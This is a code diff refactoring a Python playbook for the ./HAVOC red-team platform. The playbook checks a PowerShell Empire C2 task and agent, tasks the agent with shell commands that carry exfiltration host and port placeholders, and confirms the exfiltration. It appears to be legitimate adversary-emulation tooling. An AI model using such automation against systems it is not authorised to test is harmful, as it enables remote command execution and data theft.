@@ -19,24 +19,24 @@ init_args = init_parser.parse_args()
 
 profile = init_args.profile
 
-# Load the configuration file
-config = ConfigParser()
-config_file = os.path.expanduser('~/.havoc/config')
-config.read(config_file)
+# Load the ./HAVOC configuration file
+havoc_config = ConfigParser()
+havoc_config_file = os.path.expanduser('~/.havoc/config')
+havoc_config.read(havoc_config_file)
 
 # Get api_key and secret_key
 if profile:
-    api_key = config.get(profile, 'API_KEY')
-    secret = config.get(profile, 'SECRET')
-    api_region = config.get(profile, 'API_REGION')
-    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
-    campaign_admin_email = config.get(profile, 'CAMPAIGN_ADMIN_EMAIL')
+    api_key = havoc_config.get(profile, 'API_KEY')
+    secret = havoc_config.get(profile, 'SECRET')
+    api_region = havoc_config.get(profile, 'API_REGION')
+    api_domain_name = havoc_config.get(profile, 'API_DOMAIN_NAME')
+    campaign_admin_email = havoc_config.get(profile, 'CAMPAIGN_ADMIN_EMAIL')
 else:
-    api_key = config.get('default', 'API_KEY')
-    secret = config.get('default', 'SECRET')
-    api_region = config.get('default', 'API_REGION')
-    api_domain_name = config.get('default', 'API_DOMAIN_NAME')
-    campaign_admin_email = config.get('default', 'CAMPAIGN_ADMIN_EMAIL')
+    api_key = havoc_config.get('default', 'API_KEY')
+    secret = havoc_config.get('default', 'SECRET')
+    api_region = havoc_config.get('default', 'API_REGION')
+    api_domain_name = havoc_config.get('default', 'API_DOMAIN_NAME')
+    campaign_admin_email = havoc_config.get('default', 'CAMPAIGN_ADMIN_EMAIL')
 
 h = havoc.Connect(api_region, api_domain_name, api_key, secret)
 
@@ -66,15 +66,6 @@ exfil_task_exists = None
 exfil_portgroup_exists = None
 exfil_service_exists = None
 
-def get_task_target_ip(tn):
-    task_details = h.get_task(tn)
-    task_target_ip_list = task_details['local_ip']
-    task_target_ip = None
-    for ip in task_target_ip_list:
-        if '172.17.' not in ip:
-            task_target_ip = ip
-    return task_target_ip
-
 
 def clean_up():
     if exfil_task_exists:
@@ -94,6 +85,7 @@ def clean_up():
     # All done.
     exit('\nDone... Exiting.\n')
 
+
 # Verify c2_task exists
 print(f'\nVerifying that C2 task {c2_task_name} exists.')
 c2_task = h.verify_task(c2_task_name, 'powershell_empire')
@@ -104,17 +96,10 @@ else:
 
 # Verify that the C2 agent exists.
 print(f'\nVerifying that agent {c2_agent_name} exists.')
-c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
-c2_instruct_command = 'get_agents'
-c2_instruct_args = {'Name': c2_agent_name}
-agents_list = h.interact_with_task(c2_task_name, c2_instruct_command, c2_instruct_instance, c2_instruct_args)
-agent_exists = False
+agent = h.verify_agent(c2_task_name, c2_agent_name)
 agent_ip = None
-for agent in agents_list['agents']:
-    if c2_agent_name == agent['name']:
-        agent_ip = agent['external_ip']
-        agent_exists = True
-if agent_exists:
+if agent:
+    agent_ip = agent['external_ip']
     print(f'Agent {c2_agent_name} exists. Continuing...\n')
 else:
     exit(f'Agent {c2_agent_name} not found. Exiting...\n')
@@ -214,61 +199,27 @@ else:
 
 # Execute a list of shell commands on the agent.
 for command in command_list.split(', '):
-    if command == 'pause':
-        # Wait for key press and then go to the next command
-        input('Paused. Press Enter to continue...')
-        command = 'whoami'
     # Replace variables in shell_command
     exfil_outfile_insert = re.sub('\$EXFIL_OUTFILE', exfil_outfile, command)
     exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_outfile_insert)
     exfil_host_insert = re.sub('\$EXFIL_HOST', exfil_host, exfil_type_insert)
     shell_command = re.sub('\$EXFIL_PORT', exfil_port, exfil_host_insert)
     print(f'\nTasking agent with agent_shell_command "{shell_command}"\n')
-    # Use a random string for the agent instruct_instance of each shell command.
-    sc_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
-    instruct_command = 'agent_shell_command'
-    instruct_args = {'Name': c2_agent_name, 'command': shell_command}
-    command_response = h.interact_with_task(c2_task_name, instruct_command, sc_instruct_instance, instruct_args)
-    if command_response['outcome'] == 'success':
-        print(f'{shell_command} succeeded.\n')
-        command_task_id = command_response['message']['taskID']
-    else:
-        print(f'{instruct_command} failed.\n')
-        command_task_id = None
-
-    # Get the agent_shell_command results.
-    if command_task_id:
-        print(f'\nGetting results from agent_shell_command "{shell_command}"\n')
-        results = None
-        while not results:
-            try:
-                instruct_command = 'get_shell_command_results'
-                instruct_args = {'Name': c2_agent_name}
-                shell_results = h.interact_with_task(c2_task_name, instruct_command, sc_instruct_instance, instruct_args)
-                if shell_results['outcome'] == 'success':
-                    for shell_result in shell_results['results']:
-                        if 'taskID' in shell_result and shell_result['taskID'] == command_task_id:
-                            results = shell_result['results']
-                else:
-                    results = f'{instruct_command} failed.\n'
-                if not results:
-                    t.sleep(10)
-            except KeyboardInterrupt:
-                print('Interrupting get_shell_command_results. Exiting...')
-                clean_up()
-        print(f'\n{shell_command} results:\n')
-        print(results)
+    try:
+        shell_command_results = h.execute_agent_shell_command(c2_task_name, c2_agent_name, shell_command)
+        print(f'{shell_command} results:\n')
+        print(shell_command_results)
+    except KeyboardInterrupt:
+        print('Interrupting execute_agent_shell_command. Skipping to next command...')
 
     # Wait for the powershell_empire task to become idle.
     print(f'\nWaiting for powershell_empire task {c2_task_name} to become idle.')
     try:
         h.wait_for_idle_task(c2_task_name)
     except KeyboardInterrupt:
-        print('Interrupting wait_for_idle_task. Exiting...')
-        clean_up()
-    print(f'\n{c2_task_name} is now idle.')
-    t.sleep(random.randrange(20))
-
+        exit('Interrupting wait_for_idle_task. Exiting...')
+    print(f'{c2_task_name} is now idle.')
+    
 # Confirm that exfil was successful.
 # Use a random string for the exfil_listener instruct_instance.
 confirm_exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
